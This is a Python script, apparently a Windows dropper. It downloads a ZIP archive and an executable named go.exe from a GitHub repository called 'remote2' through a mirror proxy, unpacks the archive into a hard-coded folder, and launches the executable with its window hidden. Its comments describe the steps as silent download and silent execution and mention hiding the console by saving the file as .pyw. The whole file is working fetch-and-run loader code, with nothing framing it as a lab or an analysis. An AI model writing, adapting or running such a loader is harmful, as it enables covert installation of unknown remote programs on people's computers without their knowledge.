import os
import zipfile
import logging
import requests
import subprocess
from io import BytesIO

# 基础目录配置
BASE_DIR = r'C:\gj\guojam\is\handsome'
EXE_DIR = os.path.join(BASE_DIR, 'remote2-3')

def setup_logging():
    """初始化日志配置"""
    try:
        # 确保基础目录存在
        os.makedirs(BASE_DIR, exist_ok=True)
        
        # 配置日志系统
        LOG_PATH = os.path.join(BASE_DIR, 'operation.log')
        logging.basicConfig(
            filename=LOG_PATH,
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            encoding='utf-8'
        )
        logging.info("Logging system initialized")
    except Exception as e:
        print(f"无法初始化日志系统: {str(e)}")
        raise

def setup_directories():
    """创建所需目录结构"""
    try:
        os.makedirs(EXE_DIR, exist_ok=True)
        logging.info(f"目录已创建: {EXE_DIR}")
    except Exception as e:
        logging.error(f"目录创建失败: {str(e)}")
        raise

def download_file(url, save_path):
    """静默下载文件"""
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()
        
        with open(save_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        logging.info(f"文件下载成功: {save_path}")
        return True
    except Exception as e:
        logging.error(f"下载失败: {str(e)}")
        return False

def unzip_data(zip_data, extract_path):
    """解压ZIP数据"""
    try:
        with zipfile.ZipFile(BytesIO(zip_data)) as zip_ref:
            zip_ref.extractall(extract_path)
        logging.info(f"解压完成: {extract_path}")
        return True
    except Exception as e:
        logging.error(f"解压失败: {str(e)}")
        return False

def execute_silently(exe_path):
    """静默执行程序"""
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        process = subprocess.Popen(
            exe_path,
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        logging.info(f"程序已启动: {exe_path} (PID: {process.pid})")
        return True
    except Exception as e:
        logging.error(f"启动失败: {str(e)}")
        return False

def main():
    # 初始化日志系统
    setup_logging()
    
    try:
        # 创建目录结构
        setup_directories()

        # 下载并解压ZIP文件
        zip_url = "https://hub.gitmirror.com/https://github.com/Skywalker2333/remote2/archive/refs/tags/3.zip"
        response = requests.get(zip_url)
        if response.status_code == 200:
            if unzip_data(response.content, BASE_DIR):
                logging.info("ZIP文件处理完成")
        else:
            logging.error(f"ZIP下载失败，状态码: {response.status_code}")

        # 下载可执行文件
        exe_url = "https://hub.gitmirror.com/https://github.com/Skywalker2333/remote2/raw/refs/heads/main/go.exe"
        exe_path = os.path.join(EXE_DIR, "go.exe")
        if download_file(exe_url, exe_path):
            # 执行程序
            if execute_silently(exe_path):
                logging.info("所有操作成功完成")
                return 0
            
        return 1
    except Exception as e:
        logging.critical(f"主流程异常: {str(e)}")
        return 2

if __name__ == "__main__":
    # 隐藏控制台窗口（保存为.pyw时生效）
    exit_code = main()
    if exit_code != 0:
        os._exit(exit_code)